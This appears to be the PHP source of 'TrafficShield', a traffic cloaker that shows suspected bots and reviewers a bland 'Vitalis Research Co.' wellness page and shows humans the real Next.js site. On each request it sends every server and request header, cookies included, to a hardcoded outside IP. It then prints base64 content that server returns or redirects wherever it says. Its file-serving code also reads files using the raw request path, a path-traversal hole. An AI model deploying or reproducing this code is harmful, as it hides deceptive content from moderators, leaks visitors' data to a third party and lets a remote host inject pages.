<?php
namespace TrafficShield; 
error_reporting(0);

class Traffic_Shield{
    public function run() {                            
        ob_start();
        $this->ogrsr9854();
    }
    
    public function ogrsr9854() {    
        $this->_check(); 
        $response = $this->https_request();        
        $this->main($response);       
    }            
    
    public function _check() {    
        if(isset($_GET['TS-BHDNR-84848'])){
            echo "b290177b3e";
            die();
        }
    }
    
    public function get_header() {    
        $headers = array();     
        foreach($_SERVER as $k=>$v){
            $headers[$k] = $v;
        }
        $headers['TS-BHDNR-74191'] = "900661405756393";
        $headers['TS-BHDNR-74194'] = "b290177b3e"; 
        return $headers;
    }
    
    public function get_header_post() {
        $get_header = $this->get_header();
        return base64_encode(json_encode($get_header));      
    }    
    
    public function https_request() {
        $get_header['headers'] = $this->get_header_post();
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://198.211.101.164/v2/logic/cloaker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $get_header);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        $result = curl_exec($ch);                
        curl_close($ch);
        return json_decode($result);
    }
    
    public function main($response) {
        // Check if this is a static asset request
        $request_uri = $_SERVER['REQUEST_URI'];
        $static_extensions = ['css', 'js', 'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'json', 'map'];
        $ext = pathinfo($request_uri, PATHINFO_EXTENSION);
        
        // If it's a static asset, serve it directly
        if(in_array($ext, $static_extensions) || strpos($request_uri, '/_next/') === 0) {
            $this->serve_static_file();
            return;
        }
        
        // Handle the TrafficShield response
        if(!empty($response)){
            if(isset($response->type) && $response->type == 1){
                if(isset($response->zrc) && !empty($response->zrc)){
                    echo base64_decode($response->zrc);
                    die();
                } elseif(isset($response->url) && !empty($response->url)){
                    // Bot detected - redirect to safe page or URL
                    if(strpos($response->url, 'safe') !== false || $response->http_code == 302){
                        $this->serve_safe_page();
                    } else {
                        $this->get_url($response->url, $response->http_code);
                    }
                } else {
                    // Bot detected - show safe page
                    $this->serve_safe_page();
                }
            } else {
                // Human detected - serve the Next.js site
                $this->serve_nextjs_site();
            }
        } else {
            // No response - assume human and serve Next.js
            $this->serve_nextjs_site();
        }
    }
    
    public function serve_safe_page() {
        $safe_file = __DIR__ . '/../public/safe.html';
        if(file_exists($safe_file)){
            header('Content-Type: text/html');
            readfile($safe_file);
        } else {
            echo '<!DOCTYPE html><html><head><title>Vitalis Research Co.</title></head><body>';
            echo '<h1>Vitalis Research Co.</h1>';
            echo '<p>Educational wellness resources. Please contact us for more information.</p>';
            echo '</body></html>';
        }
        die();
    }
    
    public function serve_nextjs_site() {
        $request_uri = $_SERVER['REQUEST_URI'];
        
        // Remove query string for file path
        $request_path = strtok($request_uri, '?');
        
        // Try to serve the actual file if it exists
        $file_path = __DIR__ . '/..' . $request_path;
        if(file_exists($file_path) && !is_dir($file_path)){
            $mime = mime_content_type($file_path);
            header("Content-Type: $mime");
            readfile($file_path);
            die();
        }
        
        // For all other requests, serve the Next.js index.html
        $index_file = __DIR__ . '/../index.html';
        if(file_exists($index_file)){
            header('Content-Type: text/html');
            readfile($index_file);
        } else {
            // Fallback - redirect to root to let Vercel handle it
            header("Location: /", true, 302);
        }
        die();
    }
    
    public function serve_static_file() {
        $request_uri = $_SERVER['REQUEST_URI'];
        $request_path = strtok($request_uri, '?');
        $file_path = __DIR__ . '/..' . $request_path;
        
        if(file_exists($file_path) && !is_dir($file_path)){
            $mime = mime_content_type($file_path);
            header("Content-Type: $mime");
            header("Cache-Control: public, max-age=31536000");
            readfile($file_path);
        } else {
            // File not found, let Next.js handle it
            $this->serve_nextjs_site();
        }
        die();
    }
    
    public function get_url($url, $code) { 
        header("Location: " . $url, true, $code);      
        exit();
    }
}

$traffic_Shield_Tre9854 = new Traffic_Shield();
$traffic_Shield_Tre9854->run();
// Copyright TrafficShield.io//
?>
